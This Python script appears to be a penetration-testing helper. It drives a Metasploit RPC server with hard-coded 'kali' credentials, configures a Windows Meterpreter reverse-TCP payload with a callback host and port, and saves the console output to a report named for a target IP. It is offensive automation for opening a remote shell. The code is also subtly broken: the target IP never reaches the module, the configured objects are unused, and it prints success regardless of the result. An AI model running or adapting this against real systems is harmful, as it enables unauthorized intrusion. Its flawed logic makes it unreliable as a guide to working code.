import time
from pymetasploit3.msfrpc import MsfRpcClient
from termcolor import colored

class MetasploitModule:
    def __init__(self, username, password, server='127.0.0.1', port=55553, ssl=False):
        self.client = MsfRpcClient(password, server=server, port=port, ssl=ssl)
        print(colored(f"[INFO] Connected to Metasploit RPC server at {server}:{port}", "green"))

    def run_exploit(self, exploit_name, payload_name, lhost, lport, target_ip, report_file):
        print(colored(
            "----------------------------------- Metasploit Exploitation ------------------------------------",
            attrs=['bold']))

        # Select the exploit module
        exploit = self.client.modules.use('exploit', exploit_name)

        # Load and configure the payload separately
        payload = self.client.modules.use('payload', payload_name)
        payload['LHOST'] = lhost
        payload['LPORT'] = lport

        # Execute the exploit and capture output
        console = self.client.consoles.console()
        console.write(f"use {exploit_name}")
        console.write(f"set PAYLOAD {payload_name}")
        console.write(f"set LHOST {lhost}")
        console.write(f"set LPORT {lport}")
        console.write("exploit")

        # Poll for the output
        time.sleep(2)  # Wait a bit for the exploit to run
        output = console.read()

        # Write the output to a report file
        with open(report_file, 'w') as report:
            report.write(f"Metasploit Exploitation Report for Target IP: {target_ip}\n")
            report.write(f"{'-'*60}\n")
            report.write(output['data'])  # Write the console output to the report
            report.write(f"{'-'*60}\n")
            report.write("Exploitation completed.\n")

        print(colored(f"[SUCCESS] Metasploit exploitation started with LHOST {lhost} on LPORT {lport}.", "green"))
        print(colored(f"[INFO] Report saved to {report_file}", "blue"))

if __name__ == "__main__":
    # Example usage:
    username = 'kali'  # Metasploit username (usually not needed for local RPC)
    password = 'kali'  # Password for the Metasploit RPC server
    server = '127.0.0.1'
    port = 55553
    ssl = False

    # Target and payload details
    target_ip = '192.168.1.100'
    exploit_name = 'multi/handler'
    payload_name = 'windows/meterpreter/reverse_tcp'
    lhost = '192.168.1.1'
    lport = '4444'
    report_file = f"metasploit_report_{target_ip}.txt"

    # Initialise the MetasploitModule
    msf_module = MetasploitModule(username, password, server, port, ssl)
    
    # Run the exploit
    msf_module.run_exploit(exploit_name, payload_name, lhost, lport, target_ip, report_file)
